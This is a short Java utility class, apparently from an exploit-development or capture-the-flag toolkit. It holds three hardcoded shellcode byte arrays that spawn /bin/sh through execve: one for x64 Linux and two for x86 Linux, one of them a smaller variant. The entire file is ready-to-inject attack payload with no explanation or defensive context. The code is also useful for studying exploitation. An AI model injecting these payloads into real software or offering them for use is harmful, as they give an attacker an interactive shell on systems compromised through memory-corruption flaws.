package util;

public class Shellcode {

	public static byte[] X64_EXECVE_BIN_SH = new byte[] {
			0x50, 0x48, 0x31, (byte) 0xd2, 0x48, 0x31, (byte) 0xf6, 0x48, (byte) 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x53, 0x54, 0x5f, (byte) 0xb0, 0x3b, 0x0f, 0x05
	};
	
	public static byte[] X86_EXECVE_BIN_SH = new byte[] {
			0x31, (byte) 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, (byte) 0x89, (byte) 0xe3, 0x50, (byte) 0x89, (byte) 0xe2, 0x53, (byte) 0x89, (byte) 0xe1, (byte) 0xb0, 0x0b, (byte) 0xcd, (byte) 0x80
	};
	
	public static byte[] X86_BIN_SH_SMALL = new byte[] {
			0x31, (byte) 0xc9, (byte) 0xf7, (byte) 0xe1, (byte) 0xb0, 0x0b, 0x51, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, (byte) 0x89, (byte) 0xe3, (byte) 0xcd, (byte) 0x80
	};
}
